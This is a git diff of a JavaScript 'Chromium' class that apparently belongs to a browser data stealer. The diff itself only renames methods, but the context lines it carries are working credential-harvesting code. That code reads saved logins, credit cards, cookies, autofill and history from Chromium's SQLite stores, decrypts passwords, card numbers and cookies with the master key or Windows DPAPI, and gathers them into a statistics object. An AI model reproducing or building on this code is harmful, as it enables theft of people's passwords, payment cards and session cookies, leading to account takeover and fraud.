@@ -8,7 +8,7 @@ const cryptofy = require("./cryptofy.js");
 const structures = require("./structures");
 
 class Chromium {
-    decrypt = (encryptedPass, masterKey) => {
+    Decrypt = (encryptedPass, masterKey) => {
         if (masterKey.length === 0) {
             return cryptofy.DPAPI(encryptedPass, null, 'CurrentUser');
         }
@@ -62,7 +62,7 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM downloads');
+            const rows = await sqliteQuery.Execute('SELECT * FROM downloads');
 
             return rows.map(({ tab_url, target_path, total_bytes }) => {
                 return new structures.Download(
@@ -83,7 +83,7 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM urls');
+            const rows = await sqliteQuery.Execute('SELECT * FROM urls');
 
             return rows.map(({ url, title, visit_count, last_visit_time }) => {
                 return new structures.History(
@@ -134,7 +134,7 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM autofill');
+            const rows = await sqliteQuery.Execute('SELECT * FROM autofill');
 
             return rows.map(({ name, value }) => {
                 return new structures.Autofill(
@@ -156,14 +156,14 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(LoginDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM logins');
+            const rows = await sqliteQuery.Execute('SELECT * FROM logins');
 
             return rows.map(({ password_value, username_value, origin_url, date_created }) => {
                 let password = password_value;
 
                 try {
                     if (password) {
-                        password = this.decrypt(password, masterKey);
+                        password = this.Decrypt(password, masterKey);
                     };
 
                     if (username_value && password) {
@@ -195,14 +195,14 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM credit_cards');
+            const rows = await sqliteQuery.Execute('SELECT * FROM credit_cards');
 
             return rows.map(({ card_number_encrypted, guid, name_on_card, billing_address_id, nickname, expiration_month, expiration_year }) => {
                 let card_number = card_number_encrypted;
 
                 try {
                     if (card_number) {
-                        card_number = this.decrypt(card_number, masterKey);
+                        card_number = this.Decrypt(card_number, masterKey);
                     };
 
                     return new structures.CreditCard(
@@ -230,22 +230,22 @@ class Chromium {
         const sqliteQuery = new query.SqliteQuery(CookiesFilePath);
 
         try {
-            const rows = await sqliteQuery.execute('SELECT * FROM cookies');
+            const rows = await sqliteQuery.Execute('SELECT * FROM cookies');
 
             return rows.map(({ encrypted_value, host_key, path, is_secure, expires_utc, name }) => {
                 let cookies = encrypted_value;
 
                 try {
                     if (cookies) {
-                        cookies = this.decrypt(cookies, masterKey);
+                        cookies = this.Decrypt(cookies, masterKey);
                     };
 
-                    structures.BrowserStatistics.addSites({
+                    structures.BrowserStatistics.AddSites({
                         source: 'cookies',
                         origin_url: host_key
                     });
 
-                    structures.BrowserStatistics.addCookies({
+                    structures.BrowserStatistics.AddCookies({
                         host_key: host_key,
                         path: path,
                         is_secure: is_secure,
@@ -270,8 +270,8 @@ class Chromium {
             return [];
         }
     };
-}
+};
 
 module.exports = {
     Chromium,
-}
+};
